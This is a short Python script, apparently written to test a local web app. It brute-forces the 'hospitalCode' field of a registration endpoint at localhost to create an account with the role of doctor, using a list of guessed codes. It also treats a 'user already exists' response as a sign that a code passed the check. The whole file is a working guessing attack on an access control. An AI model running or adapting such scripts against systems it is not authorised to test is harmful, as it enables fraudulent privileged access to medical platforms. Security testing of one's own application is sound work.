import requests
import json

url = "http://localhost:3000/api/auth/register"
codes = ["1234", "123456", "admin", "root", "hospital", "alcolens", "khaos", "doctor", "test", "0000", "secret", "password"]

base_payload = {
    "name": "Hacker",
    "email": "hacker@example.com",
    "password": "password123",
    "specialization": "Hacking",
    "medicalLicense": "12345",
    "role": "doctor"
}

for code in codes:
    payload = base_payload.copy()
    payload["hospitalCode"] = code
    try:
        response = requests.post(url, json=payload)
        print(f"Trying code: {code} - Status: {response.status_code}")
        if response.status_code == 201:
            print(f"SUCCESS! Code is: {code}")
            break
        elif response.status_code == 409:
             print(f"User already exists (Code {code} might be valid but user exists)")
             # If user exists, it means the code was valid enough to reach the DB check!
             print(f"POTENTIAL SUCCESS! Code {code} passed the check.")
             break
    except Exception as e:
        print(f"Error: {e}")
